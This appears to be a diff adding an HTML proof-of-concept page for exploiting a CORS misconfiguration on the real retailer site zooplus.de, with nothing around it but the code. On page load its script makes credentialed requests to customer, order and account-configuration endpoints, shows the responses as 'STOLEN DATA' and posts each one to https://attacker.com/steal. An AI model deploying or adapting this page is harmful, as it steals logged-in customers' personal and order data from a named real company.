@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Exploit PoC</title>
+</head>
+<body>
+    <h1>Zooplus CORS Exploitation PoC</h1>
+    <p>This page attempts to steal user data via CORS misconfiguration</p>
+    
+    <div id="output"></div>
+    
+    <script>
+    // Attempt to fetch sensitive data from different origins
+    const endpoints = [
+        'https://www.zooplus.de/api/customer',
+        'https://www.zooplus.de/api/orders',
+        'https://www.zooplus.de/myaccount/api/customer-config/v1/customerconfiguration'
+    ];
+    
+    endpoints.forEach(endpoint => {
+        fetch(endpoint, {
+            credentials: 'include'  // Include cookies
+        })
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById('output').innerHTML += 
+                `<h3>STOLEN DATA from ${endpoint}:</h3>
+                 <pre>${JSON.stringify(data, null, 2)}</pre>`;
+            
+            // Send to attacker server
+            fetch('https://attacker.com/steal', {
+                method: 'POST',
+                body: JSON.stringify({
+                    endpoint: endpoint,
+                    data: data
+                })
+            });
+        })
+        .catch(err => {
+            document.getElementById('output').innerHTML += 
+                `<p>Failed: ${endpoint} - ${err}</p>`;
+        });
+    });
+    </script>
+</body>
+</html>
